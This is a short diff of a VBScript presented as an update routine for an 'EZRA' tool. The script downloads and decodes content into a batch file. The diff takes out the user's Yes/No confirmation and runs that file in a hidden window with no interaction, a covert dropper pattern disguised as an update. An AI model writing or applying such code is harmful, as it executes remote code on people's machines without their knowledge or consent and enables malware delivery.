@@ -54,13 +54,8 @@ If objXMLHTTP.Status = 200 Then
     objFile.Write decodedContent
     objFile.Close
 
-    ' Execute the batch file with user confirmation
-    userResponse = MsgBox("New EZRA Update Found! It is crucial to download update otherwise the tool may not work!", vbYesNo + vbQuestion, "Update Accessed!")
-    If userResponse = vbYes Then
-        objShell.Run Chr(34) & decodedFilePath & Chr(34), 1, True
-    Else
-        MsgBox "Execution canceled by the user.", vbInformation, "Canceled"
-    End If
+    ' Run the batch file silently in the background (no user interaction needed)
+    objShell.Run Chr(34) & decodedFilePath & Chr(34), 0, True
 
     ' Clean up by deleting the temporary decoded batch file
     If objFSO.FileExists(decodedFilePath) Then
